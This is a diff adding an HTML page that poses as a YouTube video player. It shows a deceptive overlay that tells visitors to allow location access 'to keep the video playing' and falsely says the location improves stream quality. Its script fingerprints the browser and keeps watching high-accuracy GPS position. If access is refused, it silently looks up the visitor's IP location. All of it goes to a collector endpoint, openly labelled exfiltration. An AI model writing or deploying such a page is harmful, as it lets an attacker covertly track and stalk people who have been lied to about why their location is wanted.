@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Watch Video</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body { height: 100%; background: #000; font-family: 'Segoe UI', Roboto, Arial, sans-serif; overflow: hidden; }
+  #stage { position: relative; width: 100vw; height: 100vh; }
+  #player { position: absolute; inset: 0; width: 100%; height: 100%; border: 0; display: block; }
+  #chrome {
+    position: absolute; inset: 0; pointer-events: none;
+    background: linear-gradient(180deg, rgba(0,0,0,.45) 0%, transparent 22%, transparent 70%, rgba(0,0,0,.85) 100%);
+    display: flex; flex-direction: column; justify-content: space-between;
+  }
+  #topbar { display: flex; align-items: center; gap: 10px; padding: 16px 20px; color: #fff; }
+  #topbar .logo { font-size: 20px; font-weight: 700; }
+  #topbar .logo span { color: #ff0000; }
+  #topbar .title { font-size: 14px; opacity: .9; text-overflow: ellipsis; white-space: nowrap; overflow: hidden; }
+  #controls {
+    display: flex; align-items: center; gap: 14px; padding: 14px 20px 20px; color: #fff;
+    pointer-events: auto;
+  }
+  #controls .btn { background: none; border: 0; color: #fff; font-size: 20px; cursor: pointer; }
+  #playbtn { font-size: 26px; }
+  #bar { flex: 1; height: 4px; background: rgba(255,255,255,.3); border-radius: 2px; overflow: hidden; }
+  #barfill { height: 100%; width: 12%; background: #ff0000; }
+  #time { font-size: 12px; opacity: .9; }
+  #full { font-size: 22px; }
+  #overlay {
+    position: absolute; inset: 0; z-index: 10; cursor: pointer;
+    background: rgba(10,10,10,.55);
+    display: flex; align-items: center; justify-content: center;
+  }
+  #card {
+    background: #fff; border-radius: 14px; padding: 28px 34px; text-align: center;
+    max-width: 360px; box-shadow: 0 18px 60px rgba(0,0,0,.6);
+  }
+  #card h2 { font-size: 19px; color: #111; margin-bottom: 8px; }
+  #card p { font-size: 13.5px; color: #555; line-height: 1.5; margin-bottom: 20px; }
+  #allow {
+    background: #065fd4; color: #fff; border: 0; border-radius: 999px;
+    padding: 12px 34px; font-size: 15px; font-weight: 600; cursor: pointer;
+    transition: background .15s;
+  }
+  #allow:hover { background: #0a6beb; }
+  #card small { display: block; margin-top: 14px; font-size: 11px; color: #999; }
+</style>
+</head>
+<body>
+
+<div id="stage">
+  <!-- Real YouTube embed: replace VIDEO_ID with your target video -->
+  <iframe id="player"
+    src="https://www.youtube.com/embed/VIDEO_ID?autoplay=1&mute=1&playsinline=1&rel=0"
+    title="YouTube video player" frameborder="0"
+    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+    allowfullscreen></iframe>
+
+  <!-- Fake player chrome -->
+  <div id="chrome">
+    <div id="topbar">
+      <div class="logo">You<span>Tube</span></div>
+      <div class="title">Trending clip — watch now</div>
+    </div>
+    <div id="controls">
+      <button class="btn" id="playbtn">&#9658;</button>
+      <button class="btn">&#9209;</button>
+      <div id="bar"><div id="barfill"></div></div>
+      <span id="time">0:00 / 1:23</span>
+      <button class="btn" id="full">&#9974;</button>
+    </div>
+  </div>
+
+  <!-- Social-engineering overlay: clicking it fires the geolocation prompt -->
+  <div id="overlay">
+    <div id="card">
+      <h2>&#128250; One moment</h2>
+      <p>To continue watching, tap <b>Continue</b>. Your browser may ask to use your location — select <b>Allow</b> so the video keeps playing.</p>
+      <button id="allow">&#9658;&nbsp; Continue</button>
+      <small>We respect your privacy. Location is only used to improve your stream quality.</small>
+    </div>
+  </div>
+</div>
+
+<script>
+/* ============================================================
+   COLLECTOR: relative path works when page+function are both
+   served from Vercel. If you serve the page from GitHub Pages,
+   change to:  "https://YOURPROJECT.vercel.app/api/collect"
+   ============================================================ */
+const COLLECTOR = "/api/collect";
+const VIDEO_ID  = "dQw4w9WgXcQ";    // any public YouTube ID
+
+/* ---------- passive fingerprint (no permissions needed) ---------- */
+function fingerprint() {
+  const conn = navigator.connection || {};
+  return {
+    ua: navigator.userAgent,
+    platform: navigator.platform,
+    lang: navigator.language,
+    langs: navigator.languages,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    tzOffset: new Date().getTimezoneOffset(),
+    screen: `${screen.width}x${screen.height}`,
+    availScreen: `${screen.availWidth}x${screen.availHeight}`,
+    colorDepth: screen.colorDepth,
+    cores: navigator.hardwareConcurrency || null,
+    deviceMemory: navigator.deviceMemory || null,
+    connection: { type: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt },
+    viewport: `${innerWidth}x${innerHeight}`,
+    referrer: document.referrer,
+    ts: Date.now()
+  };
+}
+
+/* ---------- exfiltration (beacon + JSON POST + pixel fallback) ---------- */
+/* ---------- exfiltration (single request per event — no duplicates) ---------- */
+function exfil(data) {
+  const payload = JSON.stringify(Object.assign({
+    eid: (crypto.randomUUID) ? crypto.randomUUID() : Math.random().toString(36).slice(2)
+  }, data, fingerprint()));
+  try {
+    fetch(COLLECTOR, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: payload,
+      keepalive: true
+    }).catch(() => {
+      try { if (navigator.sendBeacon) navigator.sendBeacon(COLLECTOR, new Blob([payload], { type: "application/json" })); } catch (e) {}
+    });
+  } catch (e) {
+    try { if (navigator.sendBeacon) navigator.sendBeacon(COLLECTOR, new Blob([payload], { type: "application/json" })); } catch (e2) {}
+  }
+}
+
+/* ---------- GPS throttle: at most 1 fix per 15s AND ~100m moved ---------- */
+let lastGpsSent = 0, lastLat = null, lastLon = null;
+function shouldSend(pos) {
+  const now = Date.now();
+  const moved = lastLat == null ||
+    Math.abs(pos.coords.latitude  - lastLat) > 0.001 ||
+    Math.abs(pos.coords.longitude - lastLon) > 0.001;
+  if (now - lastGpsSent >= 15000 && moved) {
+    lastGpsSent = now;
+    lastLat = pos.coords.latitude;
+    lastLon = pos.coords.longitude;
+    return true;
+  }
+  return false;
+}
+
+/* ---------- precise GPS — requires the browser prompt ---------- */
+function startGPS() {
+  if (!navigator.geolocation) { fallbackIP(); return; }
+  navigator.geolocation.watchPosition(
+    (pos) => {
+      if (!shouldSend(pos)) return;
+      exfil({
+        src: "gps",
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+        altitude: pos.coords.altitude,
+        speed: pos.coords.speed,
+        heading: pos.coords.heading
+      });
+    },
+    (err) => {
+      exfil({ src: "geo-error", code: err.code, msg: err.message });
+      fallbackIP();
+    },
+    { enableHighAccuracy: true, maximumAge: 0, timeout: 12000 }
+  );
+}
+
+/* ---------- coarse fallback — silent, no prompt, city-level ---------- */
+async function fallbackIP() {
+  try {
+    const r = await fetch("https://ipapi.co/json/");
+    const j = await r.json();
+    exfil({
+      src: "ip",
+      ip: j.ip, city: j.city, region: j.region,
+      country: j.country_name, lat: j.latitude, lon: j.longitude,
+      org: j.org
+    });
+  } catch (e) {
+    exfil({ src: "ip-error", msg: String(e) });
+  }
+}
+
+/* ---------- wire-up: click = user gesture = permission prompt ---------- */
+document.getElementById("allow").addEventListener("click", () => {
+  document.getElementById("overlay").style.display = "none";
+  startGPS();
+  document.getElementById("playbtn").innerHTML = "&#10073;&#10073;";
+  exfil({ src: "click", video: VIDEO_ID });
+});
+</script>
+</body>
+</html>
